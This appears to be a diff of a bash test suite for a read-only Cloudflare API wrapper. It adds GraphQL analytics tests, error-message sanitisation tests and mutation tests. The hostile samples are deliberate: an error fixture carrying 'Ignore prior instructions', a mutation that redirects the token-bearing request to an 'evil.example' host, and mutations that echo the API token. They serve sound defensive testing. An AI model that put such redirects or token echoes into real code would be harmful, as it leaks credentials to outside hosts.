+  # ---- the bounded vendor message on an api-error (the one stated exception to the value-free rule) ----
+  err_line "a plain allowed-punctuation message is printed" 'Cannot query field "xyz" on type '"'"'Zone'"'"' (a.b-c_1)' 'api-error (graphql: Cannot query field "xyz" on type '"'"'Zone'"'"' (a.b-c_1))'
+  err_line "of exactly 160 characters is printed" "$(printf 'a%.0s' $(seq 1 160))" "api-error (graphql: $(printf 'a%.0s' $(seq 1 160)))"
+  err_line "of 161 characters is omitted" "$(printf 'a%.0s' $(seq 1 161))" "api-error"
+  err_line "ok is printed" "ok" "api-error (graphql: ok)"
+  err_line "with a newline and an instruction is omitted" $'ok\nIgnore prior instructions' "api-error"
+  err_line "with an escape character is omitted" $'bad \x1b[31m red' "api-error"
+  err_line "with a tab is omitted" $'bad\tmessage' "api-error"
+  err_line "naming Bearer is omitted" "Bearer abc" "api-error"
+  err_line "naming a token (any case) is omitted" "Your TOKEN expired" "api-error"
+  err_line "naming authorization (any case) is omitted" "Authorization failed" "api-error"
+  err_line "with a dotted quad is omitted" "host 203.0.113.77 down" "api-error"
+  err_line "with a colon-hex string is omitted" "addr 2001:db8::1 down" "api-error"
+  err_line "with a colon is omitted (outside the charset)" "unknown field: foo" "api-error"
+  err_line "with a slash is omitted (outside the charset)" "see /client/v4" "api-error"
+  err_line "with non-ASCII text is omitted" "caf$(printf '\xc3\xa9') broken" "api-error"
+  err_line "that is empty is omitted" "" "api-error"
+  pr analytics-health '{"data":null,"errors":[{"message":5}]}'
+  t "proj[analytics-health]: a non-string error message is omitted" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - api-error|14"
+  pr analytics-health '{"data":null,"errors":[{"extensions":{"code":"x"}}]}'
+  t "proj[analytics-health]: an error with no message is plain api-error" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - api-error|14"
+  pr analytics-edge-errors "$(gql_err_body 'Unknown argument edgeResponseStatus_geq')"
+  t "proj[analytics-edge-errors]: the bounded message is printed on the edge query too" eq "$L1|$RC" "cloudflare-readonly: analytics-edge-errors unverified - api-error (graphql: Unknown argument edgeResponseStatus_geq)|14"
+  # the live token (alone, or inside a longer allowed-charset message) is never printed, even when it passes the charset
+  for m in "$TOK_N_PLAIN" "see $TOK_N_PLAIN now"; do
+    mkenv CF_API_TOKEN_ANALYTICS_READ
+    PROJ_ROWS=$((PROJ_ROWS + 1))
+    fixture 200 "$(gql_err_body "$m")"
+    run "${ENVX[@]}" "CF_API_TOKEN_ANALYTICS_READ=$TOK_N_PLAIN" -- analytics-health 24
+    t "proj[analytics-health]: a message holding the live token is omitted" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - api-error|14"
+    tn "proj[analytics-health]: the live token appears nowhere in the output" has_file "$WORK/comb.txt" "$TOK_N_PLAIN"
+  done
+  # HTTP 400 is an api-error as well (the same bounded message); an unparseable 400 body is plain api-error, not bad-response
+  PROJ_ROWS=$((PROJ_ROWS + 1))
+  fixture 400 "$(gql_err_body 'Syntax Error near edgeResponseStatus')"
+  run "${BASE_ENV[@]}" -- analytics-edge-errors 24
+  t "proj[analytics-edge-errors]: HTTP 400 -> api-error with the bounded message, exit 14" eq "$L1|$RC" "cloudflare-readonly: analytics-edge-errors unverified - api-error (graphql: Syntax Error near edgeResponseStatus)|14"
+  t "proj[analytics-edge-errors]: HTTP 400 leaks no canary" leak_scan "$WORK/comb.txt"
+  PROJ_ROWS=$((PROJ_ROWS + 1))
+  fixture 400 "<html>$CANARY_BODY"
+  run "${BASE_ENV[@]}" -- analytics-health 24
+  t "proj[analytics-health]: HTTP 400 with an unparseable body -> plain api-error, exit 14" eq "$L1|$RC" "cloudflare-readonly: analytics-health unverified - api-error|14"
+  t "proj[analytics-health]: HTTP 400 with an unparseable body is not echoed" leak_scan "$WORK/comb.txt"
+  # 401 and 403 mirror the REST subcommands: exit 11, one request, only the bound token
+  for k in 401:token-invalid 403:token-lacks-scope; do
+    PROJ_ROWS=$((PROJ_ROWS + 1))
+    fixture "${k%%:*}" "$ERR_BODY"
+    run "${BASE_ENV[@]}" -- analytics-health 24
+    t "proj[analytics-health]: HTTP ${k%%:*} -> unverified - ${k#*:}, exit 11, one request" eq "$L1|$RC|$(ncalls)" "cloudflare-readonly: analytics-health unverified - ${k#*:}|11|1"
+  done
 }
 
 # =============================================================================================
@@ -982,22 +1347,23 @@ grp_proj() {
 # =============================================================================================
 grp_shape() {
   local s
-  for s in "${SUBS[@]}"; do
+  for s in "${ALLSUBS[@]}"; do
+    sargs "$s"
     fixture 200 '{"success":true,"result":null}'
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "shape[$s]: a well-formed body of the wrong shape -> bad-response (shape), exit 14" eq "$L1|$RC" "cloudflare-readonly: $s unverified - bad-response (shape)|14"
     fixture 200 ''
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "shape[$s]: an empty body -> bad-response (shape), exit 14" eq "$L1|$RC" "cloudflare-readonly: $s unverified - bad-response (shape)|14"
     fixture 200 "<html>$CANARY_BODY"
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "shape[$s]: unparseable JSON -> bad-response (jq exit <n>) for a real non-zero jq exit, exit 14" bash -c '[[ "$1|$2" =~ ^cloudflare-readonly:\ $3\ unverified\ -\ bad-response\ \(jq\ exit\ [1-9][0-9]*\)\|14$ ]]' _ "$L1" "$RC" "$s"
     t "shape[$s]: the unparseable body is not echoed" leak_scan "$WORK/comb.txt"
     fixture 200 "\"$CANARY_BODY\""
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "shape[$s]: a JSON string body -> a real jq failure keeps (jq exit <n>)" bash -c '[[ "$1|$2" =~ ^cloudflare-readonly:\ $3\ unverified\ -\ bad-response\ \(jq\ exit\ [1-9][0-9]*\)\|14$ ]]' _ "$L1" "$RC" "$s"
     fixture abc "$(ok_body "$s")"
-    run "${BASE_ENV[@]}" -- "$s"
+    run "${BASE_ENV[@]}" -- "${SARGS[@]}"
     t "shape[$s]: a non-numeric status stays plain bad-response" eq "$L1|$RC" "cloudflare-readonly: $s unverified - bad-response|14"
   done
 }
@@ -1017,9 +1383,10 @@ grp_tools() {
   local s
   assert_fixture_dir "$STUB"
   if make_variant nojq 's|/usr/bin/jq|/nonexistent/jq|g'; then
-    for s in "${SUBS[@]}"; do
+    for s in "${ALLSUBS[@]}"; do
+      sargs "$s"
       fixture 200 "$(ok_body "$s")"
-      run "${BASE_ENV[@]}" -- "$s"
+      run "${BASE_ENV[@]}" -- "${SARGS[@]}"
       t "tools[$s]: no jq -> unverified - no-tool (jq), exit 14" eq "$L1|$RC" "cloudflare-readonly: $s unverified - no-tool (jq)|14"
       t "tools[$s]: no jq -> curl never called (the preflight runs before any request)" eq "$(ncalls)" 0
     done
@@ -1034,6 +1401,12 @@ grp_tools() {
     fixture 200 "$SSL_OK"
     run "${BASE_ENV[@]}" -- ssl-mode
     t "tools[ssl-mode]: no date is irrelevant to a subcommand that never calls date" eq "$L1" "cloudflare-readonly: ssl-mode ok"
+    for s in "${ANSUBS[@]}"; do
+      fixture 200 "$(ok_body "$s")"
+      run "${BASE_ENV[@]}" -- "$s" 24
+      t "tools[$s]: no date -> unverified - no-tool (date), exit 14" eq "$L1|$RC" "cloudflare-readonly: $s unverified - no-tool (date)|14"
+      t "tools[$s]: no date -> curl never called" eq "$(ncalls)" 0
+    done
   else
     vno "tools: the no-date variant could not be built (no /usr/bin/date in the wrapper)"
   fi
@@ -1047,10 +1420,128 @@ grp_tools() {
       run "${BASE_ENV[@]}" -- change-history
       t "tools[$fd]: a date that yields no valid stamp -> exit 64, curl never called" eq "$RC|$(ncalls)" "64|0"
       t "tools[$fd]: the message names only what was measured" eq "$ERR" "cloudflare-readonly: refused: date produced no valid UTC stamp"
+      # the analytics window needs both date calls (the epoch and the stamp formatting): either one failing is a value-free exit 64
+      for s in "${ANSUBS[@]}"; do
+        fixture 200 "$(ok_body "$s")"
+        run "${BASE_ENV[@]}" -- "$s" 24
+        t "tools[$fd/$s]: a date that yields no valid stamp -> exit 64, curl never called" eq "$RC|$(ncalls)" "64|0"
+        t "tools[$fd/$s]: the message is the fixed stamp refusal" eq "$ERR" "$MSG_STAMP"
+      done
     else
       vno "tools: the $fd variant could not be built"
     fi
   done
+  SUTX=""
+}
+
+# =============================================================================================
+# Group: gql (the compiled-in query bodies and the window arithmetic: what the POST actually carries)
+# =============================================================================================
+# --- TEMPLATE BLOCK: the two fixed query bodies, deliberately duplicated from the wrapper (they are the pin). A field-name fix PR
+# edits BOTH places; the masked body of every run must equal these constants. Placeholders: @ZONE@ @START@ @END@. ---
+TPL_HEALTH='{"query":"query{viewer{zones(filter:{zoneTag:\"@ZONE@\"}){httpRequestsAdaptiveGroups(limit:300,filter:{datetime_geq:\"@START@\",datetime_lt:\"@END@\",clientRequestPath:\"/health\"},orderBy:[datetimeHour_ASC]){count dimensions{datetimeHour} avg{originResponseDurationMs} quantiles{originResponseDurationMsP50 originResponseDurationMsP90}}}}}"}'
+TPL_EDGE='{"query":"query{viewer{zones(filter:{zoneTag:\"@ZONE@\"}){httpRequestsAdaptiveGroups(limit:1000,filter:{datetime_geq:\"@START@\",datetime_lt:\"@END@\",clientRequestHTTPHost:\"app.soleur.ai\",edgeResponseStatus_geq:500,edgeResponseStatus_lt:600},orderBy:[datetimeHour_DESC]){count dimensions{datetimeHour edgeResponseStatus}}}}}"}'
+# --- END TEMPLATE BLOCK ---
+BODY_PREFIX='{"query":"query{viewer{zones(filter:{zoneTag:\"'
+MSG_PREFIX="cloudflare-readonly: refused: request body does not start with the fixed query prefix"
+MSG_CTL="cloudflare-readonly: refused: request body holds a control character"
+FAKE_T=1794000123
+tpl_of() { case "$1" in analytics-health) printf '%s' "$TPL_HEALTH" ;; analytics-edge-errors) printf '%s' "$TPL_EDGE" ;; esac; }
+# body_of: the request body curl received, decoded from the data-raw config line (the config string escapes are JSON's)
+body_of() { sed -n 's/^data-raw = //p' "$STUB/stdin.log" | jq -r .; }
+epoch_of() { date -u -d "$1" +%s; }
+# check_body <subcommand> <hours> <zone> <label>: the stdin of the run that just happened
+check_body() {
+  local sub="$1" h="$2" zone="$3" lab="$4" body bz bs be masked tpl re_z re_w
+  body=$(body_of)
+  tpl=$(tpl_of "$sub")
+  re_z='zoneTag:\\"([^\\"]*)\\"'
+  re_w='datetime_geq:\\"([^\\"]*)\\",datetime_lt:\\"([^\\"]*)\\"'
+  bz="" bs="" be=""
+  if [[ "$body" =~ $re_z ]]; then bz="${BASH_REMATCH[1]}"; fi
+  if [[ "$body" =~ $re_w ]]; then bs="${BASH_REMATCH[1]}"; be="${BASH_REMATCH[2]}"; fi
+  t "gql[$lab]: the body is one JSON object with a string query" bash -c 'printf "%s" "$1" | jq -e "type==\"object\" and (.query|type)==\"string\"" > /dev/null' _ "$body"
+  t "gql[$lab]: the body starts with the fixed prefix" bash -c '[[ "$1" == "$2"* ]]' _ "$body" "$BODY_PREFIX"
+  t "gql[$lab]: the body is a single line with no control character" bash -c '[[ -n "$1" && ! "$1" =~ [[:cntrl:]] ]]' _ "$body"
+  t "gql[$lab]: the zone id in the body equals the environment" eq "$bz" "$zone"
+  t "gql[$lab]: both stamps match STAMP_RE" bash -c '[[ "$1" =~ $3 && "$2" =~ $3 ]]' _ "$bs" "$be" '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$'
+  if [[ "$bs" =~ ^[0-9]{4}- && "$be" =~ ^[0-9]{4}- ]]; then
+    t "gql[$lab]: end is on the hour" eq "$(( $(epoch_of "$be") % 3600 ))" 0
+    t "gql[$lab]: end - start equals hours x 3600" eq "$(( $(epoch_of "$be") - $(epoch_of "$bs") ))" "$((h * 3600))"
+  else
+    vno "gql[$lab]: end is on the hour (the stamps did not parse)"
+    vno "gql[$lab]: end - start equals hours x 3600 (the stamps did not parse)"
+  fi
+  masked="${body//"$be"/@END@}"
+  masked="${masked//"$bs"/@START@}"
+  masked="${masked//"$bz"/@ZONE@}"
+  t "gql[$lab]: the masked body equals the compiled-in constant" eq "$masked" "$tpl"
+  t "gql[$lab]: the hours integer appears nowhere in the body outside the two stamps" bash -c '[[ "$1" != *"hours"* && "$1" != *"$2h"* ]]' _ "$masked" "$h"
+}
+grp_gql() {
+  local an h body fd rows
+  assert_fixture_dir "$STUB"
+  t "gql: the fake clock's t is not on the hour (so a rounding mutant is visible)" test "$((10#$FAKE_T % 3600))" -ne 0
+  t "gql: the suite holds exactly the two template constants" eq "$(grep -c -E "^TPL_(HEALTH|EDGE)='" "$SELF")" 2
+  for an in "${ANSUBS[@]}"; do
+    for h in 1 216; do
+      fixture 200 "$(ok_body "$an")"
+      run "${BASE_ENV[@]}" -- "$an" "$h"
+      t "gql[$an/h$h]: run is ok" eq "$L1" "cloudflare-readonly: $an ok"
+      check_body "$an" "$h" "$ZONE" "$an/h$h"
+    done
+    # an alternate zone id and an alternate valid token value (must-pass, not canonical)
+    fixture 200 "$(ok_body "$an")"
+    run "DOPPLER_PROJECT=soleur" "DOPPLER_CONFIG=prd_terraform" "CF_ZONE_ID=$ZONE_ALT" "CF_API_TOKEN_ANALYTICS_READ=$TOK_N_PLAIN" -- "$an" 100
+    t "gql[$an/alt]: run is ok" eq "$L1" "cloudflare-readonly: $an ok"
+    check_body "$an" 100 "$ZONE_ALT" "$an/alt"
+  done
+  t "gql: query 1 filters /health with no host filter and orders ASC" bash -c '[[ "$1" == *"clientRequestPath:\\\"/health\\\""* && "$1" != *clientRequestHTTPHost* && "$1" == *"orderBy:[datetimeHour_ASC]"* ]]' _ "$TPL_HEALTH"
+  t "gql: query 2 scopes the host, uses a 500..599 range and orders DESC" bash -c '[[ "$1" == *"edgeResponseStatus_geq:500,edgeResponseStatus_lt:600"* && "$1" == *"orderBy:[datetimeHour_DESC]"* ]]' _ "$TPL_EDGE"
+
+  # --- a deterministic clock: the window is derived from the epoch by arithmetic, never compared with this test's own clock ---
+  printf '#!/bin/bash\nif [[ " $* " == *" +%%s "* ]]; then echo %s; else exec /usr/bin/date "$@"; fi\n' "$FAKE_T" > "$STUB/fakedate_clock"
+  chmod +x "$STUB/fakedate_clock"
+  if make_variant fakeclock "s|/usr/bin/env -i /usr/bin/date|/usr/bin/env -i $STUB/fakedate_clock|g"; then
+    local end_e start_e end_s start_s
+    end_e=$((10#$FAKE_T - 10#$FAKE_T % 3600))
+    for an in "${ANSUBS[@]}"; do
+      for h in 1 216; do
+        start_e=$((end_e - h * 3600))
+        end_s=$(date -u -d "@$end_e" +%Y-%m-%dT%H:%M:%SZ)
+        start_s=$(date -u -d "@$start_e" +%Y-%m-%dT%H:%M:%SZ)
+        fixture 200 "$(ok_body "$an")"
+        run "${BASE_ENV[@]}" -- "$an" "$h"
+        body=$(body_of)
+        t "gql[clock/$an/h$h]: the window is [top of the hour - $h h, top of the hour) from the fake epoch" eq "$body" "$(tpl_of "$an" | sed -e "s/@ZONE@/$ZONE/" -e "s/@START@/$start_s/" -e "s/@END@/$end_s/")"
+      done
+    done
+  else
+    vno "gql: the fake-clock variant could not be built"
+  fi
+  SUTX=""
+
+  # --- tampered templates: only a tampered constant makes the body pre-flight observable (zone and stamps are validated upstream) ---
+  if make_variant tamperprefix '/^GQL_/s|"query{viewer{zones|"mutation{viewer{zones|'; then
+    for an in "${ANSUBS[@]}"; do
+      fixture 200 "$(ok_body "$an")"
+      run "${BASE_ENV[@]}" -- "$an" 24
+      t "gql[tamper-prefix/$an]: a template that no longer starts with the fixed prefix is refused (64), curl never called" eq "$RC|$(ncalls)" "64|0"
+      t "gql[tamper-prefix/$an]: the prefix refusal has its own fixed message" eq "$ERR" "$MSG_PREFIX"
+    done
+  else
+    vno "gql: the tampered-prefix variant could not be built"
+  fi
+  if make_variant tamperctl $'s|limit:300|limit:\\n300|;s|limit:1000|limit:\\n1000|'; then
+    for an in "${ANSUBS[@]}"; do
+      fixture 200 "$(ok_body "$an")"
+      run "${BASE_ENV[@]}" -- "$an" 24
+      t "gql[tamper-ctl/$an]: a template holding a raw newline is refused (64), curl never called" eq "$RC|$(ncalls)" "64|0"
+      t "gql[tamper-ctl/$an]: the control-character refusal has its own fixed message" eq "$ERR" "$MSG_CTL"
+    done
+  else
+    vno "gql: the tampered-control-character variant could not be built"
+  fi
   SUTX=""
 }
 
@@ -1066,8 +1557,8 @@ grp_selftest() {
   printf 'SCRATCH=%s\n' "$WORK"
   vno "selftest: deliberate failing assertion (this child MUST exit non-zero)"
 }
-PROJ_FLOOR=46
-for g in source wire refuse token env status xtrace proj shape tools selftest; do
+PROJ_FLOOR=112
+for g in source wire refuse token env status xtrace proj shape tools gql selftest; do
   if [[ "$g" == selftest ]]; then
     [[ "$SELECT" == selftest ]] || continue
   fi
@@ -1271,12 +1762,12 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "G1.2 fifth dispatcher arm" "parity: array == case labels" "source,refuse" '  *) die 64 "refused: unknown subcommand" ;;' $'  raw) cf_get ssl-mode ;;\n  *) die 64 "refused: unknown subcommand" ;;'
   mutate "G1.2b fifth arm refused by unknown-endpoint row" "refuse: unknown subcommand raw -> exit 64" "source,refuse" '  *) die 64 "refused: unknown subcommand" ;;' $'  raw) cf_get ssl-mode ;;\n  *) die 64 "refused: unknown subcommand" ;;'
   mutate "G1.3 refusing arm calls cf_get" "refuse: unknown subcommand raw -> exit 64" refuse '  *) die 64 "refused: unknown subcommand" ;;' '  *) cf_get ssl-mode ;;'
-  mutate "G1.4 second curl site" "source: exactly one curl call site" "source,status" '  403) unverified token-lacks-scope 11 ;;' $'  403) /usr/bin/env -i "$CURL" -X GET "$url" --config - < <(printf \'header = "Authorization: Bearer %s"\\n\' "${CF_API_TOKEN_RULESETS:-x}"); unverified token-lacks-scope 11 ;;'
-  mutate "G1.4b second curl site (403 retried)" "curl called exactly once" "source,status" '  403) unverified token-lacks-scope 11 ;;' $'  403) /usr/bin/env -i "$CURL" -X GET "$url" --config - < <(printf \'header = "Authorization: Bearer %s"\\n\' "${CF_API_TOKEN_RULESETS:-x}"); unverified token-lacks-scope 11 ;;'
+  mutate "G1.4 second curl site" "source: exactly two curl call sites" "source,status" $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) /usr/bin/env -i "$CURL" --disable -X GET "$url" --config - < <(printf \'header = "Authorization: Bearer %s"\\n\' "${CF_API_TOKEN_RULESETS:-x}"); unverified token-lacks-scope 11 ;;'
+  mutate "G1.4b second curl site (403 retried)" "curl called exactly once" "source,status" $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) /usr/bin/env -i "$CURL" --disable -X GET "$url" --config - < <(printf \'header = "Authorization: Bearer %s"\\n\' "${CF_API_TOKEN_RULESETS:-x}"); unverified token-lacks-scope 11 ;;'
   mutate "G1.5 host overridable" "URL host is api.cloudflare.com despite a planted CF_API_BASE" wire "BASE='https://api.cloudflare.com/client/v4'" 'BASE="${CF_API_BASE:-https://api.cloudflare.com/client/v4}"'
-  mutate "G1.6a add -L" "argv has none of -d" wire '--max-redirs 0' '--max-redirs 0 -L'
-  mutate "G1.6b drop --max-redirs 0" "argv has --max-redirs 0" wire '--max-redirs 0' '--max-time 21'
-  mutate "G1.6c --disable not first" "argv[1] is --disable" wire '"$CURL" --disable' '"$CURL" --noproxy "*" --disable'
+  mutate "G1.6a add -L" "argv has none of -d" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-redirs 0 -L'
+  mutate "G1.6b drop --max-redirs 0" "argv has --max-redirs 0" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-time 21'
+  mutate "G1.6c --disable not first" "argv[1] is --disable" wire '"$CURL" --disable --noproxy '"'*'"' -X GET' '"$CURL" --noproxy "*" --disable --noproxy '"'*'"' -X GET'
   mutate "G1.7 accept extra argument" "refuse: extra positional -> exit 64" refuse 'if [ "$#" -ne 1 ]; then' 'if [ "$#" -lt 1 ]; then'
   mutate "G1.8a delete token-shape check" "token: refused shape" token 'if [[ ! "$TOK" =~ $TOKEN_RE ]]; then' 'if false; then'
   mutate "G1.8b delete trailing-whitespace trim" "token: trailing newline is accepted" token 'TOK="${TOK%"${TOK##*[![:space:]]}"}"' ':'
@@ -1286,13 +1777,39 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "G1.10 delete DOPPLER pin" "refuse: DOPPLER_CONFIG=dev -> exit 64" refuse 'if [ "${DOPPLER_PROJECT:-}" != soleur ] || [ "${DOPPLER_CONFIG:-}" != prd_terraform ]; then' 'if false; then'
   mutate "G1.11a curl by name" "source: sandbox rewrite of CURL= matches exactly once" source $'\nCURL=/usr/bin/curl\n' $'\nCURL=curl\n'
   mutate "G1.11b env override for curl path" "source: no environment override" source $'\nCURL=/usr/bin/curl\n' $'\nCURL=${CF_CURL:-/usr/bin/curl}\n'
-  mutate "G1.12 403 maps to ok" "status[ssl-mode/403]: exit 11" status '  403) unverified token-lacks-scope 11 ;;' '  403) : ;;'
+  mutate "G1.12 403 maps to ok" "status[ssl-mode/403]: exit 11" status $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) : ;;'
+
+  # --- the read-only POST site (analytics): Guard 1 of the analytics change ---
+  mutate "G1.A1 POST site sends GET" "wire[analytics-health]: recorded argv equals the closed vector" wire '-X POST -sS' '-X GET -sS'
+  mutate "G1.A2 third curl site in cf_graphql" "source: exactly two curl call sites" "source,status" '    400) gql_api_error ;;' $'    400) /usr/bin/env -i "$CURL" --disable --noproxy \'*\' -X POST -sS --max-time 20 --max-redirs 0 -w x --config - "$GQL_URL" < /dev/null; gql_api_error ;;'
+  mutate "G1.A3 GraphQL URL path changed" "wire[analytics-health]: last argv is the exact fixed GraphQL URL" wire 'GQL_URL="$BASE/graphql"' 'GQL_URL="$BASE/graphql2"'
+  mutate "G1.A3b GraphQL URL host changed" "wire[analytics-health]: URL host is api.cloudflare.com despite a planted CF_API_BASE" wire 'GQL_URL="$BASE/graphql"' 'GQL_URL="https://evil.example/client/v4/graphql"'
+  mutate "G1.A4 raw hours interpolated into the body" "gql[analytics-health/h1]: both stamps match STAMP_RE" gql '  b="${b//@START@/$WIN_START}"' '  b="${b//@START@/$WIN_START$HOURS}"'
+  mutate "G1.A5 a keyword inside a template constant" "source: neither template constant holds mutation" "source,gql" 'dimensions{datetimeHour edgeResponseStatus}}}}}"}' 'dimensions{datetimeHour edgeResponseStatus}}}} __schema"}'
+  mutate "G1.A6 fixed-prefix check removed (tampered template)" "gql[tamper-prefix/analytics-health]: a template that no longer starts with the fixed prefix is refused" gql '    *) die 64 "refused: request body does not start with the fixed query prefix" ;;' '    *) : ;;'
+  mutate "G1.A6b control-character check removed (tampered template)" "gql[tamper-ctl/analytics-health]: a template holding a raw newline is refused" gql 'if [[ "$body" =~ [[:cntrl:]] ]]; then die 64 "refused: request body holds a control character"; fi' ':'
+  mutate "G1.A7 POST site without env -i" "env[analytics-health]: curl child sees no" "source,env" '/usr/bin/env -i "$CURL" --disable --noproxy '"'*'"' -X POST' '"$CURL" --disable --noproxy '"'*'"' -X POST'
+  mutate "G1.A8 an analytics arm removed" "census: dispatcher arm terminators == 7" source $'  analytics-edge-errors) need_hours "$@"; TOKVAR=CF_API_TOKEN_ANALYTICS_READ; load_credential zone; sub_analytics_edge_errors ;;\n' ''
+  mutate "G1.A9 a third analytics arm" "census: dispatcher arm terminators == 7" source '  *) die 64 "refused: unknown subcommand" ;;' $'  analytics-extra) cf_graphql "x" ;;\n  *) die 64 "refused: unknown subcommand" ;;'
+  mutate "G1.A9b a third cf_graphql caller" "source: exactly two cf_graphql callers" source '  *) die 64 "refused: unknown subcommand" ;;' $'  analytics-extra) cf_graphql "x" ;;\n  *) die 64 "refused: unknown subcommand" ;;'
+  mutate_suite suitemut "G1.A10 harness: the stub accepts -X POST for any URL" "stub control: -X POST for a non-GraphQL URL is refused" wire 'POST) [[ "$url" == "$GQL" ]] || refuse "-X-POST-not-gra''phql" ;;' 'POST) : ;;'
+  mutate_suite suitemut "G1.A10b harness: the stub accepts -X GET for the GraphQL URL" "stub control: -X GET for the GraphQL URL is refused" wire 'GET) [[ "$url" != "$GQL" ]] || refuse "-X-GET-for-gra''phql" ;;' 'GET) : ;;'
+  mutate "G1.A11 POST 403 maps to ok" "status[analytics-health/403]: exit 11" status $'    400) gql_api_error ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    400) gql_api_error ;;\n    401) unverified token-invalid 11 ;;\n    403) : ;;'
+  mutate "G1.A11b echo the token in the POST 403 branch" "leak[analytics-health/403]" status $'    400) gql_api_error ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    400) gql_api_error ;;\n    401) unverified token-invalid 11 ;;\n    403) echo "$TOK"; unverified token-lacks-scope 11 ;;'
+  mutate "G1.A11c POST 400 maps to upstream-error" "status[analytics-health/400]: first line is" status '    400) gql_api_error ;;' '    400) unverified upstream-error 14 ;;'
+  mutate "G1.A12 the whole errors array is printed on an api-error" "api-error message ok is printed -> no canary, second message or token in the output" proj '  if [ -n "$GQL_MSG" ]; then unverified "api-error (graphql: $GQL_MSG)" 14; fi' $'  printf \'%s\\n\' "$BODY"\n  if [ -n "$GQL_MSG" ]; then unverified "api-error (graphql: $GQL_MSG)" 14; fi'
+  mutate "G1.A12b dotted-quad refusal removed" "api-error message with a dotted quad is omitted" proj $'  if [[ "$m" =~ [0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3} ]]; then return 0; fi\n' ''
+  mutate "G1.A12c live-token refusal removed" "a message holding the live token is omitted" proj $'  if [ -n "$TOK" ] && [[ "$m" == *"$TOK"* ]]; then return 0; fi\n' ''
+  mutate "G1.A12d credential-word refusal removed" "api-error message naming Bearer is omitted" proj '  case "$lm" in *bearer* | *token* | *authorization*) return 0 ;; esac' '  :'
+  mutate "G1.A12e charset widened to a colon" "api-error message with a colon is omitted" proj $'GQL_MSG_RE=\'^[A-Za-z0-9 ._\'"\'"\'"()-]{1,160}$\'' $'GQL_MSG_RE=\'^[A-Za-z0-9 ._:\'"\'"\'"()-]{1,160}$\''
+  mutate "G1.A12f length cap widened" "api-error message of 161 characters is omitted" proj '{1,160}$' '{1,400}$'
+  mutate "G1.A12g only the first message: all messages joined" "second message or token in the output" proj '.errors[0].message else empty end' '[.errors[].message] | join(" ") else empty end'
 
   # --- Guard 2: credential non-disclosure ---
-  mutate "G2.1a echo token in the 403 branch" "leak[ssl-mode/403]" status '  403) unverified token-lacks-scope 11 ;;' '  403) echo "$TOK"; unverified token-lacks-scope 11 ;;'
+  mutate "G2.1a echo token in the 403 branch" "leak[ssl-mode/403]" status $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) unverified token-lacks-scope 11 ;;' $'    2??) : ;;\n    401) unverified token-invalid 11 ;;\n    403) echo "$TOK"; unverified token-lacks-scope 11 ;;'
   mutate "G2.1b echo token on the success path" "leak[ssl-mode/200-ok]" status "printf 'cloudflare-readonly: %s ok\\n%s\\n' " "echo \"\$TOK\"; printf 'cloudflare-readonly: %s ok\\n%s\\n' "
   mutate "G2.2 token in argv" "argv carries no token, Authorization or Bearer" wire '--config - "$url"' '-H "Authorization: Bearer $TOK" "$url"'
-  mutate "G2.3 drop env -i" "curl child sees no" env '/usr/bin/env -i "$CURL"' '"$CURL"'
+  mutate "G2.3 drop env -i" "curl child sees no" env '/usr/bin/env -i "$CURL" --disable --noproxy '"'*'"' -X GET' '"$CURL" --disable --noproxy '"'*'"' -X GET'
   mutate "G2.4 print raw body on bad-response" "leak[ssl-mode/wrongtype]" status 'unverified "bad-response (jq exit $1)" 14' '{ printf "%s\n" "$BODY"; unverified "bad-response (jq exit $1)" 14; }'
   mutate "G2.5a remove the xtrace refusal" "xtrace: under bash -x" xtrace 'exit 78' ':'
   mutate "G2.5b add set -x" "source: no set -x" source 'export LC_ALL=C' $'export LC_ALL=C\nset -x'
@@ -1300,17 +1817,26 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "G2.6b add mktemp" "source: no mktemp" source 'unset SSLKEYLOGFILE' $': mktemp -u\nunset SSLKEYLOGFILE'
   mutate "G2.6c add a here-string" "source: no here-string or heredoc" source 'unset SSLKEYLOGFILE' $': <<< x\nunset SSLKEYLOGFILE'
   mutate "G2.6d add a heredoc" "source: no here-string or heredoc" source 'unset SSLKEYLOGFILE' $': <<\'EOT\'\nEOT\nunset SSLKEYLOGFILE'
-  mutate "G2.7 print curl merged stderr" "leak[ssl-mode/curl-fail]" status 'unverified "upstream-error (curl exit $rc)" 14' '{ printf "%s\n" "$out"; unverified "upstream-error (curl exit $rc)" 14; }'
+  mutate "G2.7 print curl merged stderr" "leak[ssl-mode/curl-fail]" status $'\n    unverified "upstream-error (curl exit $rc)" 14' $'\n    { printf "%s\\n" "$out"; unverified "upstream-error (curl exit $rc)" 14; }'
 
+
+  # --- Guard 2 of the analytics change: the analytics token is bound to the two analytics arms, with no fallback ---
